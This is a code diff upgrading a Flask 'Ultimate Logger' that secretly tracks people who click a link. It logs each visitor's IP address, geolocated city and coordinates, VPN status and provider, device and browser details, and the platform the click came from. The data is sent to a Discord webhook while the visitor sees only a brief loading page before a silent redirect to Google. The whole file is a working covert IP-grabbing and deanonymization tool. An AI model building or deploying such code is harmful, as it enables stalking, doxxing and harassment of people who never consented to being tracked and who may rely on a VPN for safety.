@@ -1,20 +1,17 @@
 # -*- coding: utf-8 -*-
 """
-ULTIMATE GEOLOCATION & VPN TRACKER
-- Uses 3 geolocation APIs (ipapi.co, ip-api.com, ipinfo.io with fallback)
-- Detects VPN/Proxy via multiple methods (proxy flags, ISP name matching)
-- Extracts VPN provider name (NordVPN, Mullvad, Proton, Express, etc.)
-- Full device fingerprint: OS, browser, screen, language, timezone, etc.
+ULTIMATE GEOLOCATION + VPN + REFERRER PLATFORM DETECTION
+- Tracks EXACTLY where the link was clicked (Discord, WhatsApp, TikTok, etc.)
+- Uses 3 geolocation APIs (ipapi.co, ip-api.com, ipinfo.io)
+- Detects VPN/Proxy + extracts provider name (NordVPN, Mullvad, Proton, etc.)
+- Full device fingerprint (OS, browser, device type, language, timezone)
 - Silent redirect to Google after 1.5 seconds
-- Sends rich Discord embed with all data
-- Over 350 lines of robust, production-ready Python
+- Sends rich Discord embed with "Clicked From: X" field
 """
 
 from flask import Flask, request, render_template_string, redirect
 import requests
-import re
 from datetime import datetime
-import json
 
 # ===================================================================
 # CONFIGURATION – EDIT THESE BEFORE DEPLOY
@@ -31,6 +28,82 @@ IGNORE_IPS = [
 # Flask app instantiation (MUST be top-level)
 # -------------------------------------------------------------------
 app = Flask(__name__)
+
+# ===================================================================
+# PLATFORM / REFERRER DETECTION (New Feature!)
+# ===================================================================
+
+# Mapping of URL fragments to human-readable platform names
+PLATFORM_MAP = {
+    'discord.com': 'Discord',
+    'discordapp.com': 'Discord',
+    'whatsapp.com': 'WhatsApp',
+    'wa.me': 'WhatsApp',
+    'web.whatsapp.com': 'WhatsApp (Web)',
+    'facebook.com': 'Facebook',
+    'fb.com': 'Facebook',
+    'fb.watch': 'Facebook Watch',
+    'instagram.com': 'Instagram',
+    'tiktok.com': 'TikTok',
+    'snapchat.com': 'Snapchat',
+    'twitter.com': 'Twitter / X',
+    'x.com': 'Twitter / X',
+    'reddit.com': 'Reddit',
+    'telegram.org': 'Telegram',
+    't.me': 'Telegram',
+    'youtube.com': 'YouTube',
+    'youtu.be': 'YouTube',
+    'meet.google.com': 'Google Meet',
+    'linkedin.com': 'LinkedIn',
+    'messenger.com': 'Facebook Messenger',
+    'mail.google.com': 'Gmail (Email)',
+    'outlook.com': 'Outlook (Email)',
+    'yahoo.com': 'Yahoo (Email)',
+    'github.com': 'GitHub',
+    'gitlab.com': 'GitLab',
+    'medium.com': 'Medium',
+    'spotify.com': 'Spotify',
+    'twitch.tv': 'Twitch',
+    'discord.gg': 'Discord Invite',
+    'steamcommunity.com': 'Steam',
+    'roblox.com': 'Roblox',
+}
+
+def detect_platform(referer):
+    """
+    Detect the social media / app platform from the referer URL.
+    Returns a clean platform name or 'Direct / Unknown'.
+    """
+    if not referer:
+        return '📌 Direct Link / Unknown'
+
+    referer_lower = referer.lower()
+    
+    # Special cases for shortened or deep links
+    if 'l.facebook.com' in referer_lower or 'lm.facebook.com' in referer_lower:
+        return 'Facebook (Link Redirect)'
+    if 'l.instagram.com' in referer_lower:
+        return 'Instagram (Link Redirect)'
+    if 't.co' in referer_lower:
+        return 'Twitter / X (t.co)'
+    if 'lnkd.in' in referer_lower:
+        return 'LinkedIn (lnkd.in)'
+    
+    for domain, platform in PLATFORM_MAP.items():
+        if domain in referer_lower:
+            return platform
+
+    # If we can't match a known platform, show the domain
+    try:
+        from urllib.parse import urlparse
+        parsed = urlparse(referer)
+        domain = parsed.netloc or parsed.path
+        if domain:
+            return f"🔗 Unknown Site ({domain})"
+    except:
+        pass
+    
+    return f"🔗 Other: {referer[:50]}..."
 
 # ===================================================================
 # HELPER FUNCTIONS
@@ -53,7 +126,6 @@ def parse_user_agent(ua):
     browser = "Unknown Browser"
     device = "Desktop"
 
-    # OS detection
     if "Windows NT 10.0" in ua:
         os_name = "Windows 10/11"
     elif "Windows NT 6.1" in ua:
@@ -81,7 +153,6 @@ def parse_user_agent(ua):
     elif "Linux" in ua:
         os_name = "Linux"
 
-    # Browser detection
     if "Edg/" in ua:
         browser = "Microsoft Edge"
     elif "OPR/" in ua or "Opera" in ua:
@@ -95,7 +166,6 @@ def parse_user_agent(ua):
     elif "Trident/" in ua or "MSIE" in ua:
         browser = "Internet Explorer"
 
-    # Device type
     if "Tablet" in ua or "iPad" in ua:
         device = "Tablet"
     elif "Mobile" in ua and device != "Tablet":
@@ -108,7 +178,6 @@ def parse_user_agent(ua):
 # -------------------------------------------------------------------
 
 def get_geo_ipapi_co(ip):
-    """Query ipapi.co – provides proxy/vpn flags and org name."""
     try:
         r = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
         if r.status_code != 200:
@@ -130,7 +199,6 @@ def get_geo_ipapi_co(ip):
         return None
 
 def get_geo_ip_api(ip):
-    """Query ip-api.com – has 'proxy' field and good ISP name."""
     try:
         r = requests.get(
             f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,proxy,timezone',
@@ -155,7 +223,6 @@ def get_geo_ip_api(ip):
         return None
 
 def get_geo_ipinfo(ip):
-    """Query ipinfo.io (free, no token required but limited)."""
     try:
         r = requests.get(f'https://ipinfo.io/{ip}/json', timeout=5)
         if r.status_code != 200:
@@ -163,11 +230,8 @@ def get_geo_ipinfo(ip):
         data = r.json()
         if 'bogon' in data:
             return None
-        # ipinfo.io returns 'org' as "ASN ISP"
         org = data.get('org', '')
-        # Extract ISP name from "AS1234 ISP Name"
         isp = org.split(' ', 1)[-1] if org else None
-        # Coordinates are in "lat,lon" format
         loc = data.get('loc', '').split(',')
         lat = loc[0] if len(loc) > 0 else None
         lon = loc[1] if len(loc) > 1 else None
@@ -178,7 +242,7 @@ def get_geo_ipinfo(ip):
             'lat': lat,
             'lon': lon,
             'isp': isp,
-            'proxy': False,  # ipinfo.io free doesn't give proxy flag
+            'proxy': False,
             'timezone': data.get('timezone'),
         }
     except:
@@ -193,20 +257,18 @@ VPN_PROVIDERS = [
     'CyberGhost', 'Private Internet Access', 'PIA', 'VyprVPN',
     'Windscribe', 'TunnelBear', 'Hotspot Shield', 'HideMyAss',
     'HMA', 'IPVanish', 'StrongVPN', 'Perfect Privacy', 'ZenVPN',
-    'Cloudflare WARP', '1.1.1.1', 'OVPN', 'PrivadoVPN', 'Atlas VPN',
+    'Cloudflare WARP', 'OVPN', 'PrivadoVPN', 'Atlas VPN',
     'FastestVPN', 'PureVPN', 'Ivacy', 'NordLayer', 'Perimeter 81',
     'Tailscale', 'ZeroTier', 'WireGuard', 'OpenVPN'
 ]
 
 def extract_vpn_provider(isp_name):
-    """Return the VPN provider name if found in ISP string, else None."""
     if not isp_name:
         return None
     isp_lower = isp_name.lower()
     for provider in VPN_PROVIDERS:
         if provider.lower() in isp_lower:
             return provider
-    # also catch common abbreviations
     if 'nord' in isp_lower:
         return 'NordVPN'
     if 'mullvad' in isp_lower:
@@ -224,28 +286,19 @@ def extract_vpn_provider(isp_name):
 # -------------------------------------------------------------------
 
 def get_geo_info(ip):
-    """
-    Try ipapi.co first (most accurate proxy flag), then ip-api.com,
-    then ipinfo.io as fallback. Merge results to get best data.
-    """
     best = {}
-    # Try ipapi.co
     result = get_geo_ipapi_co(ip)
     if result:
         best = result
-    # Try ip-api.com to potentially get better ISP or proxy flag
     result2 = get_geo_ip_api(ip)
     if result2:
-        # Overwrite missing fields from first result
         for key in ['country', 'region', 'city', 'lat', 'lon', 'isp', 'timezone']:
             if not best.get(key) and result2.get(key):
                 best[key] = result2[key]
-        # If proxy flag is more reliable from ip-api.com, use it
         if result2.get('proxy') is True:
             best['proxy'] = True
         elif result2.get('proxy') is False and not best.get('proxy'):
             best['proxy'] = False
-    # Try ipinfo.io as final fallback for missing fields
     if not best.get('isp') or not best.get('country'):
         result3 = get_geo_ipinfo(ip)
         if result3:
@@ -258,12 +311,11 @@ def get_geo_info(ip):
 # DISCORD NOTIFICATION
 # ===================================================================
 
-def send_discord_embed(ip, geo, ua, screen_res, language, timezone):
+def send_discord_embed(ip, geo, ua, language, platform):
     """Build and send a rich Discord embed with all collected data."""
     if not DISCORD_WEBHOOK_URL:
         return
 
-    # Prepare fields
     vpn_status = "🟢 No VPN/Proxy"
     color = 0x00ff00
     vpn_provider = None
@@ -272,7 +324,6 @@ def send_discord_embed(ip, geo, ua, screen_res, language, timezone):
         if geo.get('proxy') is True:
             vpn_status = "🔴 VPN/Proxy Detected"
             color = 0xff0000
-        # Check ISP for VPN provider
         isp = geo.get('isp', '')
         vpn_provider = extract_vpn_provider(isp)
         if vpn_provider and vpn_status == "🔴 VPN/Proxy Detected":
@@ -285,7 +336,6 @@ def send_discord_embed(ip, geo, ua, screen_res, language, timezone):
 
     os_name, browser, device = parse_user_agent(ua)
 
-    # Build embed fields
     fields = [
         {"name": "🌍 IP Address", "value": f"`{ip}`", "inline": True},
         {"name": "🛡️ VPN / Proxy", "value": vpn_status, "inline": True},
@@ -293,19 +343,19 @@ def send_discord_embed(ip, geo, ua, screen_res, language, timezone):
         {"name": "🗺️ Coordinates", "value": f"`{coords_str}`", "inline": True},
         {"name": "📡 ISP / Org", "value": isp_str, "inline": True},
         {"name": "🕒 Timezone", "value": tz_str, "inline": True},
-        {"name": "💻 Device Type", "value": device, "inline": True},
-        {"name": "🖥️ Operating System", "value": os_name, "inline": True},
+        {"name": "📱 Clicked From", "value": platform, "inline": False},   # <--- NEW FIELD!
+        {"name": "💻 Device", "value": device, "inline": True},
+        {"name": "🖥️ OS", "value": os_name, "inline": True},
         {"name": "🌐 Browser", "value": browser, "inline": True},
-        {"name": "🖥️ Screen Resolution", "value": screen_res, "inline": True},
         {"name": "🌎 Language", "value": language, "inline": True},
         {"name": "📅 Timestamp", "value": f"<t:{int(datetime.utcnow().timestamp())}:F>", "inline": False},
     ]
 
     embed = {
-        "title": "🎯 Visitor Logged (Accurate Geo + VPN)",
+        "title": "🎯 Visitor Logged (Platform + VPN)",
         "color": color,
         "fields": fields,
-        "footer": {"text": "Ultimate Logger · v2.0"},
+        "footer": {"text": "Ultimate Logger · v3.0"},
         "timestamp": datetime.utcnow().isoformat()
     }
 
@@ -322,15 +372,17 @@ def send_discord_embed(ip, geo, ua, screen_res, language, timezone):
 def index():
     ip = get_client_ip()
     if not should_ignore(ip):
+        # Get referrer and detect platform
+        referer = request.headers.get('Referer', '')
+        platform = detect_platform(referer)
+        
         # Get geolocation + VPN info
         geo = get_geo_info(ip)
         ua = request.headers.get('User-Agent', 'Unknown')
-        # Additional fingerprinting
-        screen = request.headers.get('X-Screen-Resolution', 'N/A (not sent)')
         language = request.headers.get('Accept-Language', 'Unknown')
-        timezone = request.headers.get('X-Timezone', 'Unknown')  # seldom sent
+        
         # Send to Discord
-        send_discord_embed(ip, geo, ua, screen, language, timezone)
+        send_discord_embed(ip, geo, ua, language, platform)
 
     # Render a simple "Loading..." page with meta refresh to Google
     html = """
@@ -356,7 +408,6 @@ def index():
     """
     return render_template_string(html)
 
-# Compatibility alias (not necessary but kept for old links)
 @app.route('/verify')
 def verify():
     return index()
